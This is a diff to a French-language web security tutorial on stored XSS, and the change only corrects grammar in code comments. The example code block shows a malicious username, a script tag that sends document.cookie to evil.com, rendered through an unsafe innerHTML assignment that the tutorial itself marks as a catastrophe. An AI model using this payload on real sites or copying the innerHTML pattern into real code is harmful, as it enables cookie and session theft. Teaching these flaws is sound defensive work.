@@ -30,8 +30,8 @@ Stored XSS est le plus dangereux : un attaquant poste un commentaire une fois, e
 ### Exemple qui casse
 
 ```js
-// Scénario : afficher le nom d'shinobi dans la page
-// L'shinobi s'est inscrit avec ce "nom" : <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
+// Scénario : afficher le nom d'un shinobi dans la page
+// Le shinobi s'est inscrit avec ce "nom" : <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
 
 const username = getUserFromDB(); // retourne la chaîne malveillante
 document.getElementById('welcome').innerHTML = `Bonjour ${username}`; // CATASTROPHE
